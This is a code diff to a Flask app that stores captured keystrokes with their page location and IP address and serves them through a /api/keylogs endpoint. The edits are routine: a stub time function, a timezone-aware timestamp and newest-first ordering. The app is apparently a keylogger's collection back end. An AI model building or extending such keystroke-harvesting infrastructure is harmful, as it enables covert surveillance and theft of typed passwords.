@@ -20,6 +20,9 @@ db = SQLAlchemy(app)
 migrate = Migrate()
 migrate.init_app(app, db)
 
+def get_current_time():
+    pass
+
 class Blogs(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     title = db.Column(db.String(100), nullable = False)
@@ -31,7 +34,7 @@ class Key_strokes(db.Model):
     key = db.Column(db.String(15), nullable = False)
     location = db.Column(db.String(30), nullable = False)
     ip_address = db.Column(db.String(30), nullable = True)
-    timestamp = db.Column(db.DateTime, default = datetime.utcnow)
+    timestamp = db.Column(db.DateTime(timezone=True), default = datetime.utcnow)
 
 class Login(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -102,7 +105,7 @@ def new_keylog():
 
 @app.route("/api/keylogs" , methods = ['GET'])
 def key_logs():
-    keyLogs = Key_strokes.query.all()
+    keyLogs = Key_strokes.query.order_by(Key_strokes.id.desc()).all()
     all_logs = jsonify([*map(keylogs_serializer, keyLogs)])
     return all_logs
 
